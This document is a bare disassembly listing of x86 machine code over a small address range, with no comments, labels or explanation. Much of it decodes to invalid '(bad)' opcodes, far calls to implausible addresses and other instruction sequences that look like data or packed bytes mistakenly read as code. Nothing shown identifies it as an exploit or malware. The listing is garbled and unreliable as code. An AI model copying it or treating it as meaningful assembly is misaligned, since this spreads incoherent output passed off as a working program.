  4098de:	sbb    eax,DWORD PTR [edx+esi*2]
  4098e1:	jne    0x4098b5
  4098e3:	add    dh,BYTE PTR [esi+0x75]
  4098e6:	rol    BYTE PTR [edx],cl
  4098e8:	ins    BYTE PTR es:[edi],dx
  4098e9:	jne    0x4098b1
  4098eb:	add    ah,BYTE PTR [edi+0x75]
  4098ee:	mov    esi,0x18750002
  4098f3:	test   DWORD PTR [ecx+0x75],eax
  4098f6:	dec    edx
  4098f7:	pop    es
  4098f8:	dec    ebx
  4098f9:	lock stc 
  4098fb:	(bad)  
  4098fd:	add    BYTE PTR [eax],al
  4098ff:	add    BYTE PTR [eax],al
  409901:	add    BYTE PTR [edx+ebp*2+0x1d2ffbb],al
  409908:	mov    dh,0xdb
  40990a:	sub    al,0xae
  40990c:	addr16 push edi
  40990e:	cmp    esi,edi
  409910:	ins    BYTE PTR es:[edi],dx
  409911:	adc    BYTE PTR [ebp+0x72be4212],ah
  409917:	sbb    BYTE PTR [esi-0x24],dl
  40991a:	inc    ebp
  40991b:	or     eax,0xf5f83f1c
  409920:	outs   dx,BYTE PTR ds:[esi]
  409921:	jl     0x409968
  409923:	adc    ch,BYTE PTR [ebx+0x51]
  409926:	jne    0x4098ea
  409928:	xor    eax,0x37aeacdc
  40992d:	xchg   DWORD PTR [edx+0x257b6ebd],ebp
  409933:	adc    ch,BYTE PTR [ebx+0x56]
  409936:	jne    0x4098fa
  409938:	xor    eax,0x93aeccdc
  40993d:	cmp    al,bh
  40993f:	cmc    
  409940:	outs   dx,BYTE PTR ds:[esi]
  409941:	jnp    0x409988
  409943:	adc    ch,BYTE PTR [ebx+0x56]
  409946:	jne    0x40990a
  409948:	xor    eax,0x4faeacdc
  40994d:	xchg   esi,eax
  40994e:	outs   dx,BYTE PTR ds:[esi]
  40994f:	fist   WORD PTR [ebx+0x6312244f]
  409955:	xchg   ecx,eax
  409956:	repnz mov bh,0x35
  409959:	mov    ebp,0x9652f345
  40995e:	outs   dx,BYTE PTR ds:[esi]
  40995f:	fbstp  TBYTE PTR [ebx+0x4f]
  409962:	les    edx,FWORD PTR [ecx]
  409964:	arpl   WORD PTR [ecx+0x0],dx
  40996a:	add    dl,dl
  40996c:	mov    bh,0xb5
  40996e:	mov    esp,0x3f2f325
  409973:	jne    0x409977
  409975:	jb     0x4099ca
  409977:	aaa    
  409978:	add    cl,BYTE PTR [edi+eax*8-0x6a42fdcb]
  40997f:	xor    al,0x2
  409981:	sub    DWORD PTR [ecx+0x37],esp
  409984:	add    al,BYTE PTR [eax]
  409986:	scas   al,BYTE PTR es:[edi]
  409987:	xor    eax,0x76e9204e
  40998c:	add    al,BYTE PTR [eax]
  40998e:	mov    ecx,0xc954533f
  409993:	jbe    0x409997
  409995:	add    BYTE PTR [esi],dh
  409997:	retf   0x41
  40999a:	leave  
  40999b:	jbe    0x40999f
  40999d:	add    BYTE PTR [eax+0x1e],bl
  4099a0:	inc    ecx
  4099a1:	add    BYTE PTR [eax],dh
  4099a3:	push   cs
  4099a4:	inc    ecx
  4099a5:	add    BYTE PTR [esi],ah
  4099a7:	push   cs
  4099a8:	inc    ecx
  4099a9:	add    BYTE PTR [ecx],dh
  4099ab:	or     BYTE PTR [ecx+0x0],al
  4099ae:	pop    ebx
  4099af:	pop    ds
  4099b0:	inc    ecx
  4099b1:	add    BYTE PTR [ebp-0x24],cl
  4099b4:	ss add ah,ah
  4099b7:	jbe    0x4099bb
  4099b9:	add    BYTE PTR [ebp-0x18],ah
  4099bc:	inc    eax
  4099bd:	add    BYTE PTR [esi-0x1d],al
  4099c0:	inc    eax
  4099c1:	add    BYTE PTR [edi-0x1b],ah
  4099c4:	inc    eax
  4099c5:	add    cl,al
  4099c7:	loopne 0x409a09
  4099c9:	add    bl,dl
  4099cb:	loop   0x409a0d
  4099cd:	add    BYTE PTR [edx+0x0],cl
  4099d0:	add    BYTE PTR [eax],al
  4099d2:	add    BYTE PTR [eax],al
  4099d4:	dec    ebp
  4099d5:	inc    esp
  4099d6:	add    BYTE PTR [edx-0x3b],al
  4099d9:	inc    eax
  4099da:	add    BYTE PTR [ebx-0x37ffbf36],ch
  4099e0:	and    al,BYTE PTR [ecx+0x0]
  4099e3:	dec    edx
  4099e4:	lods   eax,DWORD PTR ds:[esi]
  4099e5:	inc    esp
  4099e6:	add    BYTE PTR [ecx-0x63],dl
  4099e9:	inc    esp
  4099ea:	add    al,dh
  4099ec:	and    al,0x41
  4099ee:	add    BYTE PTR ds:0xba004979,ah
  4099f4:	jbe    0x409a48
  4099f6:	add    BYTE PTR [ebp-0x4fffbe8a],ch
  4099fc:	jbe    0x409a00
  4099fe:	add    BYTE PTR [esi+0x5176],dh
  409a04:	loopne 0x409a08
  409a06:	add    BYTE PTR [eax],al
  409a08:	jp     0x4099c0
  409a0a:	inc    eax
  409a0b:	add    ah,bh
  409a0d:	dec    esp
  409a0e:	pop    edi
  409a0f:	dec    edi
  409a10:	int3   
  409a11:	popa   
  409a12:	outs   dx,BYTE PTR ds:[esi]
  409a13:	push   esp
  409a14:	fist   WORD PTR [edx+0x53]
  409a17:	outs   dx,DWORD PTR ds:[esi]
  409a18:	out    dx,eax
  409a19:	addr16 gs je 0x4099a9
  409a1d:	add    al,BYTE PTR [eax]
  409a1f:	add    BYTE PTR [eax+edx*2],ch
  409a22:	pop    edi
  409a23:	inc    ebx
  409a24:	add    BYTE PTR [ecx+0x73],ch
  409a27:	gs dec esp
  409a29:	add    al,BYTE PTR [eax]
  409a2b:	add    ah,bh
  409a2d:	dec    edi
  409a2e:	pop    edi
  409a2f:	push   eax
  409a30:	rcr    DWORD PTR [ebp+0x6c],cl
  409a33:	add    BYTE PTR [esp+ecx*2+0x525f],cl
  409a3a:	add    BYTE PTR [eax],al
  409a3c:	add    BYTE PTR [ecx+0x7c006461],bh
  409a42:	dec    esp
  409a43:	pop    edi
  409a44:	push   edi
  409a45:	into   
  409a46:	imul   esi,DWORD PTR [ebp+eiz*2+0x1c],0x5b000002
  409a4e:	push   ebp
  409a4f:	je     0x409aa1
  409a51:	pop    esi
  409a52:	imul   esp,DWORD PTR [ebp+esi*2-0x41],0x72
  409a57:	dec    ecx
  409a58:	outs   dx,BYTE PTR ds:[esi]
  409a59:	jp     0x409ac6
  409a5b:	add    BYTE PTR [eax],al
  409a5d:	fs jb  0x409ad4
  409a60:	jo     0x409a88
  409a62:	sub    ebp,DWORD PTR [edi]
  409a64:	ja     0x4099f1
  409a66:	jae    0x409a96
  409a68:	bound  eax,QWORD PTR [ebp+0x6f2e6768]
  409a6e:	imul   ebp,DWORD PTR [ebp+0x2f],0xffffffcc
  409a72:	add    DWORD PTR [eax],eax
  409a74:	add    BYTE PTR [edx+esi*2+0x74],dh
  409a78:	jo     0x409a10
  409a7a:	sub    ebp,DWORD PTR [edi]
  409a7c:	ja     0x409a29
  409a7e:	jb     0x409aae
  409a80:	addr16 jne 0x409a3f
  409a83:	addr16 and DWORD PTR [bp+0x6328],edi
  409a89:	sbb    cl,dh
  409a8b:	daa    
  409a8c:	add    BYTE PTR [ebp-0x71],dh
  409a8f:	test   DWORD PTR [edi],edi
  409a91:	jne    0x409a82
  409a93:	test   DWORD PTR [edi],edi
  409a95:	jne    0x409a2f
  409a97:	add    bh,BYTE PTR [ecx+0x75]
  409a9a:	cwde   
  409a9b:	add    cl,BYTE PTR [ebp+esi*2-0x6e]
  409a9f:	add    dh,BYTE PTR [ebx+0x0]
  409aa2:	add    BYTE PTR [eax],al
  409aa4:	add    BYTE PTR [eax],al
  409aa6:	jne    0x409a3f
  409aa8:	add    dl,BYTE PTR [esi+0x75]
  409aab:	add    BYTE PTR [edx],0x65
  409aae:	jne    0x409b24
  409ab0:	add    esi,DWORD PTR [ebx]
  409ab2:	jne    0x409a6d
  409ab4:	add    al,BYTE PTR [eax]
  409ab6:	jne    0x409a56
  409ab8:	add    al,BYTE PTR [ebp+esi*2-0x5e]
  409abc:	add    al,BYTE PTR [ebx+0x75]
  409abf:	dec    edi
  409ac0:	add    al,0x69
  409ac2:	jne    0x409b02
  409ac4:	add    al,0x6e
  409ac6:	jne    0x409b1f
  409ac8:	add    al,0x0
  409aca:	jne    0x409af4
  409acc:	add    al,0x69
  409ace:	jne    0x409b18
  409ad0:	add    al,0x65
  409ad2:	jne    0x409b0d
  409ad4:	add    al,0x6f
  409ad6:	jne    0x409aee
  409ad8:	add    al,0x49
  409ada:	jne    0x409ae8
  409adc:	add    al,0x6e
  409ade:	jne    0x409ae7
  409ae0:	add    al,0x46
  409ae2:	jne    0x409afd
  409ae4:	add    al,0x61
  409ae6:	jne    0x409ae6
  409ae8:	add    esp,DWORD PTR [ebp+0x75]
  409aeb:	jmp    0x409aef
  409aed:	add    BYTE PTR [ebp+0x28],dh
  409af0:	add    al,0x6f
  409af2:	jne    0x409af9
  409af4:	add    al,0x73
  409af6:	jne    0x409af4
  409af8:	add    ebp,DWORD PTR [ebp+esi*2-0x2]
  409afc:	add    edx,DWORD PTR [edi+0x75]
  409aff:	add    dl,al
  409b01:	add    edx,DWORD PTR [ebx+0x2]
  409b04:	lds    eax,FWORD PTR [ebx]
  409b06:	dec    edx
  409b07:	add    bl,dh
  409b09:	add    eax,DWORD PTR [eax]
  409b0b:	add    BYTE PTR [eax],al
  409b0d:	add    BYTE PTR [eax],al
  409b0f:	add    bh,BYTE PTR ss:[ebp-0x45fdebfd]
  409b16:	add    esp,DWORD PTR [esi]
  409b18:	add    ch,cl
  409b1a:	add    esi,DWORD PTR [ebp+0x2]
  409b1d:	or     al,BYTE PTR [esi+eax*2]
  409b20:	add    bh,bl
  409b22:	add    eax,DWORD PTR [edx+0x2]
  409b25:	fild   WORD PTR [ebx]
  409b27:	cmp    eax,0x7503e902
  409b2c:	add    bh,BYTE PTR [edx-0x65fd13fd]
  409b32:	add    eax,esi
  409b34:	add    dl,BYTE PTR [ecx-0x7afd2bfd]
  409b3a:	add    ecx,edx
  409b3c:	add    bh,BYTE PTR [esi+0x3]
  409b3f:	jne    0x409b43
  409b41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b42:	dec    edx
  409b43:	lods   eax,DWORD PTR ds:[esi]
  409b44:	inc    ebp
  409b45:	sub    al,0x4
  409b47:	jne    0x409b4b
  409b49:	adc    esp,DWORD PTR [edi]
  409b4b:	pop    DWORD PTR [edx]
  409b4d:	sub    BYTE PTR [ebx-0x6a],ah
  409b50:	pop    ebp
  409b51:	pop    ecx
  409b52:	jo     0x409bac
  409b54:	inc    esi
  409b55:	dec    eax
  409b56:	call   0x905f:0x486d
  409b5c:	cmp    BYTE PTR [ecx],cl
  409b5e:	add    al,0x75
  409b60:	add    ch,BYTE PTR [edx]
  409b62:	addr16 fwait
  409b64:	fs or  al,0x63
  409b67:	mov    DWORD PTR [ecx+0xe],ebp
  409b6a:	data16 aas 
  409b6c:	and    ch,BYTE PTR [edx]
  409b6e:	push   0x9046f62
  409b73:	add    BYTE PTR [eax],al
  409b75:	add    BYTE PTR [eax],al
  409b77:	add    BYTE PTR [edi+0x2],bh
  409b7a:	cld    
  409b7b:	jno    0x409bce
  409b7d:	gs push cs
  409b7f:	mov    bx,WORD PTR [esi+0x0]
  409b83:	add    eax,0x1e00025d
  409b88:	push   edi
  409b89:	outs   dx,BYTE PTR ds:[esi]
  409b8a:	popa   
  409b8b:	rcr    BYTE PTR [eax+0x4d],1
  409b8e:	jae    0x409b54
  409b90:	inc    esp
  409b91:	inc    ecx
  409b92:	addr16 int3 
  409b94:	sbb    BYTE PTR [esi+0x53],ch
  409b97:	aad    0x24
  409b99:	imul   ebp,DWORD PTR [esi-0x32],0x2f000276
  409ba0:	mov    ecx,0xae890041
  409ba5:	inc    ecx
  409ba6:	add    BYTE PTR [ecx+esi*2],al
  409ba9:	outs   dx,DWORD PTR ds:[esi]
  409baa:	add    ah,cl
  409bac:	jbe    0x409be0
  409bae:	add    cl,ah
  409bb0:	jbe    0x409c2c
  409bb2:	add    bh,al
  409bb4:	jbe    0x409bd3
  409bb6:	add    BYTE PTR [edx-0x33fffd8a],bl
  409bbc:	jbe    0x409c2d
  409bbe:	add    ah,al
  409bc0:	jbe    0x409bf4
  409bc2:	add    BYTE PTR [ecx-0x16ff858a],dh
  409bc8:	jbe    0x409bcc
  409bca:	add    BYTE PTR [esi],ch
  409bcc:	aam    0x6e
  409bce:	push   eax
  409bcf:	pop    ebx
  409bd0:	rcr    BYTE PTR [edi+0x41],cl
  409bd3:	dec    ebp
  409bd4:	xchg   ebp,eax
  409bd5:	jo     0x409c3c
  409bd7:	pop    edx
  409bd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bd9:	add    al,BYTE PTR [eax]
  409bdb:	xor    eax,0x0
  409be0:	add    BYTE PTR [edx-0x77d29b9f],bl
  409be6:	pusha  
  409be7:	jb     0x409c31
  409be9:	xchg   DWORD PTR [ecx+0x41],edi
  409bec:	jmp    0x37409e67
  409bf1:	test   DWORD PTR [edi],edi
  409bf3:	jb     0x409bf9
  409bf5:	nop
  409bf6:	outs   dx,BYTE PTR ds:[esi]
  409bf7:	gs cmp eax,0x8657061
  409bfd:	push   ebp
  409bfe:	add    al,BYTE PTR [eax]
  409c00:	add    BYTE PTR [edx+0x71724372],ch
  409c06:	pop    ebp
  409c07:	je     0x409c6e
  409c09:	jno    0x409c7a
  409c0b:	gs jb  0x409c7a
  409c0e:	jo     0x409c7f
  409c10:	arpl   WORD PTR [ecx+0xa00736f],si
  409c16:	arpl   WORD PTR [ecx+0x75],dx
  409c19:	shl    DWORD PTR [eax+0x79],0x49
  409c1d:	jmp    0x745d:0xc9726f54
  409c24:	imul   ebp,DWORD PTR [ebx-0x448dafa4],0xcf73655f
  409c2e:	(bad)  
  409c2f:	(bad)  
  409c30:	(bad)  
  409c31:	mov    esi,0xdf556c62
  409c36:	popa   
  409c37:	jb     0x409c8d
  409c39:	hlt    
  409c3a:	jae    0x409ca1
  409c3c:	popa   
  409c3d:	lock push esp
  409c3f:	je     0x409ca2
  409c41:	fisub  WORD PTR [ecx+0x0]
  409c44:	add    BYTE PTR [eax],al
  409c46:	add    BYTE PTR [eax],al
  409c48:	add    BYTE PTR [eax],al
  409c4a:	or     BYTE PTR [edx+0x72],dl
  409c4d:	dec    esp
  409c4e:	sti    
  409c4f:	fs inc sp
  409c52:	enter  0x69,0x0
  409c56:	mov    BYTE PTR [edx+0x72],ah
  409c59:	inc    edi
  409c5a:	mov    cl,0x72
  409c5c:	inc    esp
  409c5d:	ins    BYTE PTR es:[edi],dx
  409c5e:	mov    eax,0xb06e613e
  409c63:	pop    edx
  409c64:	add    BYTE PTR gs:[edi+0x6],bh
  409c68:	dec    edi
  409c69:	add    BYTE PTR [edx+0x6],dl
  409c6c:	push   esp
  409c6d:	add    BYTE PTR [ebx+0x6],dh
  409c70:	inc    ecx
  409c71:	add    BYTE PTR [esi+0x6],ch
  409c74:	inc    ebp
  409c75:	add    BYTE PTR [eax+0x65004d06],bh
  409c7b:	push   es
  409c7c:	arpl   WORD PTR [eax],ax
  409c7e:	jne    0x409c8d
  409c80:	add    al,0x6f
  409c82:	jne    0x409c90
  409c84:	add    al,0x6f
  409c86:	jne    0x409c89
  409c88:	add    al,0x74
  409c8a:	jne    0x409c9b
  409c8c:	add    al,0x57
  409c8e:	jne    0x409c92
  409c90:	add    al,0x6e
  409c92:	jne    0x409c9b
  409c94:	add    al,0x6f
  409c96:	jne    0x409c68
  409c98:	add    dh,BYTE PTR [ebx+0x75]
  409c9b:	sti    
  409c9c:	add    ecx,DWORD PTR [esi+0x75]
  409c9f:	scas   eax,DWORD PTR es:[edi]
  409ca0:	add    bl,BYTE PTR [ebp+esi*2-0x64]
  409ca4:	add    dh,BYTE PTR [ebp+0x75]
  409ca7:	lods   eax,DWORD PTR ds:[esi]
  409ca8:	add    dh,BYTE PTR [edx+0x75]
  409cab:	mov    BYTE PTR [edx],0x6e
  409cae:	add    BYTE PTR [eax],al
  409cb0:	add    BYTE PTR [eax],al
  409cb2:	add    BYTE PTR [ebp-0x51],dh
  409cb5:	add    dl,BYTE PTR [esi+0x75]
  409cb8:	mov    BYTE PTR [edx],0x72
  409cbb:	jne    0x409c49
  409cbd:	add    ch,BYTE PTR [ecx+0x75]
  409cc0:	add    BYTE PTR [edx],0x6e
  409cc3:	jne    0x409c7c
  409cc5:	add    dl,BYTE PTR [eax+0x75]
  409cc8:	lea    eax,[edx]
  409cca:	outs   dx,DWORD PTR ds:[esi]
  409ccb:	jne    0x409c4e
  409ccd:	add    ch,BYTE PTR [ecx+0x75]
  409cd0:	jg     0x409cd4
  409cd2:	gs jne 0x409c7c
  409cd5:	add    ch,BYTE PTR [ecx+0x75]
  409cd8:	ins    BYTE PTR es:[edi],dx
  409cd9:	add    esi,DWORD PTR [ebp+esi*2+0x47]
  409cdd:	add    al,0x25
  409cdf:	jne    0x409d2d
  409ce1:	add    al,0x0
  409ce3:	jne    0x409d10
  409ce5:	add    al,0x72
  409ce7:	jne    0x409d19
  409ce9:	add    al,0x66
  409ceb:	jne    0x409d3f
  409ced:	add    al,0x6c
  409cef:	jne    0x409d37
  409cf1:	add    al,0x49
  409cf3:	jne    0x409d3b
  409cf5:	add    al,0x61
  409cf7:	jne    0x409d41
  409cf9:	add    al,0x65
  409cfb:	jne    0x409cff
  409cfd:	cmp    DWORD PTR [esp+edx*4],eax
  409d00:	add    dl,BYTE PTR ds:0xe9025d04
  409d06:	add    esi,DWORD PTR [ebp+0x2]
  409d09:	jmp    0xe84c487d
  409d0e:	outs   dx,DWORD PTR ds:[esi]
  409d0f:	mov    ds:0xc2c1da0b,eax
  409d14:	imul   ebx,ebp,0xc1
  409d1a:	add    BYTE PTR [eax],al
  409d1c:	mov    edx,0x7f20db69
  409d21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d22:	retf   0x5603
  409d25:	add    ch,cl
  409d27:	add    esi,DWORD PTR [ebp+0x2]
  409d2a:	mov    esp,0x3c849e88
  409d2f:	pop    ds
  409d30:	mul    BYTE PTR [esi+0x45]
  409d33:	add    eax,DWORD PTR [esi+0x7d]
  409d36:	fwait
  409d37:	pop    es
  409d38:	sub    edi,DWORD PTR [edi-0x57]
  409d3b:	dec    ebx
  409d3c:	jp     0x409cf7
  409d3e:	clc    
  409d3f:	dec    esp
  409d40:	mov    cl,bh
  409d42:	add    esi,ebp
  409d44:	or     al,0x3
  409d46:	retf   0xdcf3
  409d49:	sbb    BYTE PTR [esi+edi*1+0x49],ah
  409d4d:	push   ebx
  409d4e:	pusha  
  409d4f:	outs   dx,BYTE PTR ds:[esi]
  409d50:	imul   ebx,ebx,0x2747a95
  409d56:	jb     0x409d20
  409d58:	pop    edx
  409d59:	and    eax,0x687501fe
  409d5e:	push   0xfffffffb
  409d60:	jp     0x409dd6
  409d62:	sti    
  409d63:	jle    0x409d1c
  409d65:	adc    ah,BYTE PTR [esp+eax*8-0x57]
  409d69:	add    eax,0xdc294908
  409d6e:	out    0x86,al
  409d70:	loop   0x409d90
  409d72:	jo     0x409dbd
  409d74:	sbb    DWORD PTR [ebx+edi*1-0x4],edi
  409d78:	add    DWORD PTR [eax+0x0],ecx
  409d7b:	stc    
  409d7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d7d:	out    dx,eax
  409d7e:	adc    al,0xd1
  409d80:	add    BYTE PTR [eax],al
  409d82:	add    BYTE PTR [eax],al
  409d84:	add    BYTE PTR [eax+0x42],ch
  409d87:	add    BYTE PTR [edx-0x52],dh
  409d8a:	adc    cl,BYTE PTR [ecx+0x467cd924]
  409d90:	leave  
  409d91:	imul   eax,DWORD PTR [esi-0x24],0x50322e5c
  409d98:	xchg   BYTE PTR [esi+ecx*1+0x12],bh
  409d9c:	sub    DWORD PTR [ecx-0x1],edi
  409d9f:	mov    dh,0xef
  409da1:	mov    ?,WORD PTR [edx]
  409da3:	je     0x409d7a
  409da5:	sti    
  409da6:	out    0x14,eax
  409da8:	fnsave [edx+0x33]
  409dab:	rcl    BYTE PTR [edx-0x73],0x7b
  409daf:	push   es
  409db0:	iret   
  409db1:	sub    ebp,DWORD PTR [edi+0x1e]
  409db4:	call   0xf12ba02f
  409db9:	sbb    ecx,DWORD PTR [eax]
  409dbb:	data16 jb 0x409db7
  409dbe:	or     eax,DWORD PTR [ecx]
  409dc0:	jmp    0xa4ca063b
  409dc5:	call   0x8cd7:0x7ff9427c
  409dcc:	mov    dl,0x8c
  409dce:	or     eax,eax
  409dd0:	retf   0x7a31
  409dd3:	dec    esp
  409dd4:	adc    ebx,eax
  409dd6:	sbb    BYTE PTR [ebp-0x7cadd54c],cl
  409ddc:	sub    DWORD PTR [ebp+0x52],edi
  409ddf:	push   0xffffffe8
  409de1:	retf   
  409de2:	mov    ebp,0x483fde7
  409de7:	add    BYTE PTR [edx+0x0],dh
  409dea:	add    BYTE PTR [eax],al
  409dec:	add    BYTE PTR [eax],al
  409dee:	inc    esi
  409def:	xchg   ch,dh
  409df1:	push   esp
  409df2:	jge    0x409e28
  409df4:	rol    dl,0xb0
  409df7:	jnp    0x409e37
  409df9:	bound  eax,QWORD PTR [edi+eiz*8+0x26]
  409dfd:	add    BYTE PTR [ebx+0x5],ah
  409e00:	add    BYTE PTR [edx+0x1d9cad4],cl
  409e06:	sbb    eax,0xd0458b03
  409e0b:	jns    0x409dcb
  409e0d:	je     0x409e34
  409e0f:	jmp    0x1ac89f12
  409e14:	mov    eax,DWORD PTR [ebp-0x30]
  409e17:	outs   dx,DWORD PTR ds:[esi]
  409e18:	aas    
  409e19:	adc    BYTE PTR [ebx],cl
  409e1b:	mov    ebx,0x39afc019
  409e20:	clc    
  409e21:	sbb    DWORD PTR [ebx+edi*8],0x4f
  409e25:	dec    ecx
  409e27:	test   BYTE PTR [ecx-0x902bbb],0xfe
  409e2e:	fsubr  QWORD PTR [edx+0x0]
  409e31:	add    BYTE PTR [edx+ecx*8+0x29c98b6],bl
  409e38:	mov    al,bl
  409e3a:	rcl    DWORD PTR [eax+0x5b],cl
  409e3d:	leave  
  409e3e:	dec    esi
  409e3f:	jmp    0x409e3f
  409e41:	push   esp
  409e42:	pop    es
  409e43:	iret   
  409e44:	jg     0x409e32
  409e46:	int3   
  409e47:	stc    
  409e48:	(bad)  
  409e49:	(bad)  
  409e4a:	fisttp WORD PTR [eax-0x75]
  409e4d:	fdivr  DWORD PTR [ebx+0xe8ca6f]
  409e53:	add    BYTE PTR [eax],al
  409e55:	add    BYTE PTR [eax],al
  409e57:	dec    ecx
  409e58:	in     al,dx
  409e59:	(bad)  
  409e5a:	(bad)  
  409e5b:	cli    
  409e5c:	test   dh,dh
  409e5e:	add    eax,0xbc8843
  409e63:	dec    esp
  409e64:	add    ch,BYTE PTR [eax+0x63]
  409e67:	pop    ecx
  409e68:	add    al,BYTE PTR [eax]
  409e6a:	(bad)  
  409e6b:	fst    DWORD PTR [esi+0x4f53fff8]
  409e71:	add    BYTE PTR [eax+0xa],dl
  409e74:	xchg   BYTE PTR [esi-0x10bac06],cl
  409e7a:	out    0x75,eax
  409e7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e7d:	rol    DWORD PTR [ecx],1
  409e7f:	jne    0x409ee1
  409e81:	inc    ebp
  409e82:	adc    dh,dh
  409e84:	lahf   
  409e85:	inc    DWORD PTR [ebp+esi*1+0x35830538]
  409e8c:	or     BYTE PTR [ecx],al
  409e8e:	mov    bh,0xad
  409e90:	fdiv   DWORD PTR [eax+0x2db705f]
  409e96:	mov    DWORD PTR [eax-0x71],ebp
  409e99:	imul   edi,DWORD PTR [ebx],0x8187e4bb
  409e9f:	jne    0x409e7c
  409ea1:	add    ah,BYTE PTR [esi-0x10]
  409ea4:	mov    dl,0x77
  409ea6:	jge    0x409ea7
  409ea8:	repz lock enter 0x72f5,0x3
  409eae:	ja     0x409ef9
  409eb0:	pusha  
  409eb1:	push   edi
  409eb2:	or     al,ch
  409eb4:	jbe    0x409e4e
  409eb6:	stc    
  409eb7:	mov    dl,0x4c
  409eb9:	push   ebx
  409eba:	lea    eax,[eax]
  409ebc:	add    BYTE PTR [eax],al
  409ebe:	add    BYTE PTR [eax],al
  409ec0:	clc    
  409ec1:	imul   ebp,esi,0xfffffffe
  409ec4:	mov    ds:0x6dc183aa,al
  409ec9:	jbe    0x409f3a
  409ecb:	cld    
  409ecc:	popf   
  409ecd:	mov    ecx,0x5f8affd7
  409ed2:	les    esi,FWORD PTR [ebx+0x29]
  409ed5:	pusha  
  409ed6:	push   edi
  409ed7:	cld    
  409ed8:	ds sub eax,0x97fe4d79
  409ede:	adc    dh,bh
  409ee0:	dec    ebp
  409ee1:	lock ret 0xae8c
  409ee5:	cmc    
  409ee6:	and    eax,ecx
  409ee8:	not    BYTE PTR [edi]
  409eea:	cmp    al,0xf
  409eec:	or     dh,al
  409eee:	neg    eax
  409ef0:	outs   dx,BYTE PTR ds:[esi]
  409ef1:	and    al,BYTE PTR [ebp+0x7d8979c1]
  409ef7:	xchg   esp,eax
  409ef8:	in     eax,0x1
  409efa:	jecxz  0x409eec
  409efc:	xor    edx,DWORD PTR [eax+0x6a]
  409eff:	ret    
  409f00:	jbe    0x409f54
  409f02:	or     bh,BYTE PTR [ebp-0x333ef874]
  409f08:	lods   al,BYTE PTR ds:[esi]
  409f09:	add    cl,ch
  409f0b:	jl     0x409f37
  409f0d:	xchg   DWORD PTR [ecx+0x2b796c77],esp
  409f13:	cld    
  409f14:	out    dx,eax
  409f15:	sub    ecx,eax
  409f17:	or     ch,BYTE PTR [ebx-0x188316fd]
  409f1d:	jns    0x409f42
  409f1f:	std    
  409f20:	shl    BYTE PTR [edi+0x2e8],cl
  409f26:	add    BYTE PTR [eax],al
  409f28:	add    BYTE PTR [ebp+0x78],dh
  409f2b:	and    edi,ebp
  409f2d:	iret   
  409f2e:	(bad)  
  409f2f:	mov    edx,0x224c33c3
  409f34:	mov    ebx,0x56e905b4
  409f39:	out    dx,al
  409f3a:	frstor [edi-0x21]
  409f3d:	mov    BYTE PTR [edx],0xe9
  409f40:	add    eax,DWORD PTR [esi+0x79]
  409f43:	mov    ebx,0xf940ffff
  409f48:	clc    
  409f49:	retf   0xf253
  409f4c:	ret    
  409f4d:	inc    ebx
  409f4e:	jg     0x409f11
  409f50:	sbb    DWORD PTR [esi-0x3b],edx
  409f53:	in     eax,dx
  409f54:	mov    ecx,0xdb6a014a
  409f59:	cmp    BYTE PTR [ecx-0x55],0xcf
  409f5d:	imul   eax,DWORD PTR [esi+0x27505f0],0xffffffb1
  409f64:	cmp    esp,ecx
  409f66:	sub    BYTE PTR [ecx-0x5edc16c5],ah
  409f6c:	cmp    esp,ecx
  409f6e:	(bad)  
  409f6f:	imul   ebx,ebx,0x35e6769e
  409f75:	xor    eax,0x74efffda
  409f7a:	add    al,BYTE PTR [eax]
  409f7c:	bound  esi,QWORD PTR [ebx+0x23e98afa]
  409f82:	pushf  
  409f83:	xchg   eax,ebp
  409f85:	jbe    0x409f89
  409f87:	mov    edi,DWORD PTR [edx-0x1667ffbf]
  409f8d:	add    BYTE PTR [eax],al
  409f8f:	add    BYTE PTR [eax],al
  409f91:	add    BYTE PTR [esi-0x27],dh
  409f94:	loope  0x409f7e
  409f96:	jbe    0x409f9a
  409f98:	push   DWORD PTR [ecx+ecx*1]
  409f9b:	jns    0x409f5f
  409f9d:	ror    ebx,0xed
  409fa0:	(bad)  
  409fa1:	scas   al,BYTE PTR es:[edi]
  409fa2:	sbb    cl,dl
  409fa4:	add    cl,ch
  409fa6:	jbe    0x40a01f
  409fa8:	retf   0xed91
  409fab:	out    dx,eax
  409fac:	add    cl,ch
  409fae:	pop    eax
  409faf:	jg     0x409fa8
  409fb1:	in     eax,dx
  409fb2:	fs (bad) 
  409fb4:	out    0x1d,eax
  409fb6:	push   0xc1720000
  409fbb:	js     0x409fff
  409fbd:	fld    DWORD PTR [edi-0x350b7730]
  409fc3:	sub    dl,dh
  409fc5:	fsub   QWORD PTR [ebp-0xd]
  409fc8:	xlat   BYTE PTR ds:[ebx]
  409fc9:	add    dh,BYTE PTR [ecx-0x5c5e3d80]
  409fcf:	mov    ah,0xa
  409fd1:	or     dh,BYTE PTR [edx+0x7f9bd8f4]
  409fd7:	mov    ecx,0xffb16a51
  409fdc:	dec    edi
  409fdd:	or     bh,BYTE PTR [esi+0x7e410359]
  409fe3:	cmp    DWORD PTR [edx],eax
  409fe5:	jmp    0x17c57bd9
  409fea:	in     eax,dx
  409feb:	jl     0x409f77
  409fed:	lods   al,BYTE PTR ds:[esi]
  409fee:	pop    esi
  409fef:	js     0x40a028
  409ff1:	bound  ebp,QWORD PTR [ebx]
  409ff3:	jecxz  0x40a03b
  409ff5:	add    BYTE PTR [eax],al
  409ff7:	add    BYTE PTR [eax],al
  409ff9:	add    BYTE PTR [eax],al
  409ffb:	or     DWORD PTR [esi],eax
  409ffd:	add    BYTE PTR [edx-0x6316c],cl
  40a003:	dec    esp
  40a004:	(bad)  
  40a005:	call   0x3fed73
  40a00a:	cmp    bl,dh
  40a00c:	imul   eax,DWORD PTR ds:0xe9de6189,0x2abf8f06
  40a016:	mov    DWORD PTR [ecx-0x22],edx
  40a019:	xor    edi,edi
  40a01b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a01c:	sar    bh,0xff
  40a01f:	sbb    al,0x82
  40a021:	adc    DWORD PTR [eax],0xffffffca
  40a024:	(bad)  
  40a026:	push   edi
  40a027:	pop    esp
  40a028:	ins    DWORD PTR es:[edi],dx
  40a029:	push   esp
  40a02a:	lock gs jb 0x40a022
  40a02e:	jmp    ecx
  40a030:	dec    esi
  40a031:	push   ss
  40a032:	inc    eax
  40a033:	int3   
  40a034:	das    
